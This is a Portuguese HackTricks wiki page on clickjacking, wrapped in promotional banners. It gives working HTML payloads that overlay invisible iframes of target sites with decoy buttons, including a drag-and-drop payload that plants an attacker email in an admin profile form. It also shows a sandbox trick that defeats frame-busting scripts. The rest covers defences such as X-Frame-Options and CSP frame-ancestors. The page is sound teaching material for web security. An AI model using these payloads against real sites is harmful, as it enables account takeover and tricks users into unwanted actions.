# Clickjacking

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## O que √© Clickjacking

Em um ataque de clickjacking, um **usu√°rio** √© **enganado** para **clicar** em um **elemento** em uma p√°gina da web que est√° **invis√≠vel** ou disfar√ßado como um elemento diferente. Essa manipula√ß√£o pode levar a consequ√™ncias indesejadas para o usu√°rio, como o download de malware, redirecionamento para p√°ginas da web maliciosas, fornecimento de credenciais ou informa√ß√µes sens√≠veis, transfer√™ncias de dinheiro ou a compra online de produtos.


### Truque de pr√©-preenchimento de formul√°rios

√Äs vezes √© poss√≠vel **preencher o valor dos campos de um formul√°rio usando par√¢metros GET ao carregar uma p√°gina**. Um atacante pode abusar desse comportamento para preencher um formul√°rio com dados arbitr√°rios e enviar a carga de clickjacking para que o usu√°rio pressione o bot√£o Enviar.

### Preencher formul√°rio com Arrastar e Soltar

Se voc√™ precisa que o usu√°rio **preencha um formul√°rio** mas n√£o quer pedir diretamente a ele para escrever algumas informa√ß√µes espec√≠ficas (como o e-mail e/ou senha espec√≠fica que voc√™ conhece), voc√™ pode simplesmente pedir a ele para **Arrastar e Soltar** algo que escrever√° seus dados controlados como neste [**exemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload B√°sico
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Carga √önica
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Carga Drag\&Drop + Clique
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se voc√™ identificou um ataque de **XSS que requer que um usu√°rio clique** em algum elemento para **acionar** o XSS e a p√°gina √© **vulner√°vel ao clickjacking**, voc√™ pode abusar disso para enganar o usu√°rio a clicar no bot√£o/link.  
Exemplo:  
_Voc√™ encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **apenas voc√™ pode definir e ler**). A p√°gina com o **formul√°rio** para definir esses detalhes √© **vulner√°vel** ao **Clickjacking** e voc√™ pode **pr√©-preencher** o **formul√°rio** com os par√¢metros GET._  
__Um atacante poderia preparar um ataque de **Clickjacking** para essa p√°gina **pr√©-preenchendo** o **formul√°rio** com o **payload XSS** e **enganando** o **usu√°rio** a **enviar** o formul√°rio. Assim, **quando o formul√°rio for enviado** e os valores forem modificados, o **usu√°rio executar√° o XSS**.

## Estrat√©gias para Mitigar o Clickjacking

### Defesas do Lado do Cliente

Scripts executados no lado do cliente podem realizar a√ß√µes para prevenir o Clickjacking:

* Garantir que a janela da aplica√ß√£o seja a janela principal ou superior.
* Tornar todos os frames vis√≠veis.
* Impedir cliques em frames invis√≠veis.
* Detectar e alertar os usu√°rios sobre poss√≠veis tentativas de Clickjacking.

No entanto, esses scripts de quebra de frames podem ser contornados:

* **Configura√ß√µes de Seguran√ßa dos Navegadores:** Alguns navegadores podem bloquear esses scripts com base em suas configura√ß√µes de seguran√ßa ou falta de suporte ao JavaScript.
* **Atributo `sandbox` do iframe HTML5:** Um atacante pode neutralizar scripts de quebra de frames definindo o atributo `sandbox` com os valores `allow-forms` ou `allow-scripts` sem `allow-top-navigation`. Isso impede que o iframe verifique se √© a janela superior, por exemplo,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Os valores `allow-forms` e `allow-scripts` permitem a√ß√µes dentro do iframe, enquanto desabilitam a navega√ß√£o de n√≠vel superior. Para garantir a funcionalidade pretendida do site alvo, permiss√µes adicionais como `allow-same-origin` e `allow-modals` podem ser necess√°rias, dependendo do tipo de ataque. Mensagens no console do navegador podem orientar sobre quais permiss√µes permitir.

### Defesas do Lado do Servidor

#### X-Frame-Options

O cabe√ßalho de resposta HTTP **`X-Frame-Options` informa aos navegadores sobre a legitimidade de renderizar uma p√°gina em um `<frame>` ou `<iframe>`, ajudando a prevenir o Clickjacking:

- `X-Frame-Options: deny` - Nenhum dom√≠nio pode enquadrar o conte√∫do.
- `X-Frame-Options: sameorigin` - Apenas o site atual pode enquadrar o conte√∫do.
- `X-Frame-Options: allow-from https://trusted.com` - Apenas o 'uri' especificado pode enquadrar a p√°gina.
- Observe as limita√ß√µes: se o navegador n√£o suportar essa diretiva, ela pode n√£o funcionar. Alguns navegadores preferem a diretiva frame-ancestors do CSP.

#### Diretiva frame-ancestors da Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

A **diretiva `frame-ancestors` no CSP** √© o m√©todo recomendado para prote√ß√£o contra Clickjacking:

- `frame-ancestors 'none'` - Semelhante a `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Semelhante a `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Semelhante a `X-Frame-Options: allow-from`.

Por exemplo, o seguinte CSP permite apenas o enquadramento do mesmo dom√≠nio:

`Content-Security-Policy: frame-ancestors 'self';`

Detalhes adicionais e exemplos complexos podem ser encontrados na [documenta√ß√£o do CSP frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) e na [documenta√ß√£o do Mozilla CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) com `child-src` e `frame-src`

A **Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)** √© uma medida de seguran√ßa que ajuda a prevenir o Clickjacking e outros ataques de inje√ß√£o de c√≥digo, especificando quais fontes o navegador deve permitir carregar conte√∫do.

#### Diretiva `frame-src`
- Define fontes v√°lidas para frames.
- Mais espec√≠fico do que a diretiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta pol√≠tica permite frames da mesma origem (self) e https://trusted-website.com.

#### Diretiva `child-src`
- Introduzida no CSP n√≠vel 2 para definir fontes v√°lidas para web workers e frames.
- Atua como um fallback para frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta pol√≠tica permite frames e workers da mesma origem (self) e https://trusted-website.com.

**Notas de Uso:**
- Descontinua√ß√£o: child-src est√° sendo gradualmente substitu√≠do por frame-src e worker-src.
- Comportamento de Reserva: Se frame-src estiver ausente, child-src √© usado como reserva para frames. Se ambos estiverem ausentes, default-src √© usado.
- Defini√ß√£o Estrita de Fonte: Inclua apenas fontes confi√°veis nas diretivas para evitar explora√ß√£o.

#### Scripts JavaScript de Quebra de Frames

Embora n√£o seja totalmente √† prova de falhas, scripts de quebra de frames baseados em JavaScript podem ser usados para evitar que uma p√°gina da web seja enquadrada. Exemplo:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Utilizando Tokens Anti-CSRF

* **Valida√ß√£o de Token:** Utilize tokens anti-CSRF em aplica√ß√µes web para garantir que solicita√ß√µes que alteram o estado sejam feitas intencionalmente pelo usu√°rio e n√£o por meio de uma p√°gina Clickjacked.

## Refer√™ncias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
